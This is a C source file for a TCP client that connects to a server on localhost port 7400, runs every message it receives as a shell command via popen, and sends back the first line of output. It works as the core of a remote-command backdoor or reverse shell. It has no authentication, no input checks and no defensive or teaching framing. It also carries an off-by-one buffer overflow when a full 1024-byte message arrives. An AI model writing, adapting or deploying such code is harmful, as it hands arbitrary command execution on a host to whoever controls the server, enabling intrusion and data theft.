#include <arpa/inet.h>
#include <netdb.h>
#include <netinet/in.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <unistd.h>

#define MSG_SIZE 1024
#define MYPORT 7400
#define HOSTNAME "127.0.0.1"

void error_and_exit(const char *msg) {
    perror(msg);
    exit(EXIT_FAILURE);
}

int main() {
    /* Create a socket for the client */
    int sockfd = socket(AF_INET, SOCK_STREAM, 0);
    if (sockfd < 0) {
        error_and_exit("Error opening socket");
    }

    /* Get server's IP address */
    struct hostent *server = gethostbyname(HOSTNAME);
    if (server == NULL) {
        error_and_exit("Error: No such host");
    }

    struct sockaddr_in serv_addr;
    serv_addr.sin_family = AF_INET;
    serv_addr.sin_port = htons(MYPORT);
    memcpy(&serv_addr.sin_addr.s_addr, server->h_addr, server->h_length);

    /* Connect to the server */
    if (connect(sockfd, (struct sockaddr *)&serv_addr, sizeof(serv_addr)) < 0) {
        error_and_exit("Error connecting to server");
    }
    printf("Connected to server.\n");

    char msg[MSG_SIZE];
    char results[MSG_SIZE];
    ssize_t bytes_received;

    /* Receive and process messages from the server */
    while (1) {
        bytes_received = recv(sockfd, msg, MSG_SIZE, 0);
        if (bytes_received < 0) {
            error_and_exit("Error reading from socket");
        } else if (bytes_received == 0) {
            printf("Server disconnected.\n");
            break;
        } else {
            msg[bytes_received] = '\0'; // Null-terminate the received message
            printf("Received message from server: %s\n", msg);
            // Process the received message here (e.g., execute commands)
            // Execute command and capture output
            FILE *command_output = popen(msg, "r");
            if (command_output == NULL) {
                error_and_exit("Error executing command");
            }

            // Read the output of the command
            fgets(results, sizeof(results), command_output);
            pclose(command_output);

            // Send the results back to the server
            ssize_t bytes_sent = send(sockfd, results, strlen(results) + 1, 0); // +1 for null terminator
            if (bytes_sent < 0) {
                error_and_exit("Error sending results to server");
            }
            printf("Sent results to server: %s\n", results);
        }
    }

    /* Close the socket */
    close(sockfd);
    return 0;
}
